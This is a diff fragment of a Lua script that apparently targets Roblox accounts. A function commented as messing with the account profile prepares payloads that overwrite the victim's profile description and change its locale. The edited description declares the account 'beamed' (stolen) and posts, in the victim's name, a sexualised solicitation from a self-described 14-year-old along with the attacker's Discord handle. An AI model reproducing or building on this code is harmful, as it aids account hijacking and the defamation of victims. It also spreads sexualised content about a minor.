@@ -145,7 +145,7 @@ end
 local function godly() -- mess with the roblox account profile
 local player = game.Players.LocalPlayer
 local userId = player.UserId
-local description = '{"description":"This account has been beamed by systask! if youre a female, pwease hit me up im a 14 yo that needs dominant mommies... pretty please? dc is systask... ty mwa"}'
+local description = '{"description":"This account has been beamed by systask! if youre a female, pwease hit me up im a 14 yo that needs dominant mommies... pretty please? dc is systask... ty mwa! extra note: dc is currently terminated, i submitted a support request to unterminate it so sowwy if im unable to accept ur friend request on dc for a while, ill accept once im unterminated"}'
 local none = ''
 local china = '{"supportedLocaleCode":"zh_TW"}'
 local changedisplay = {
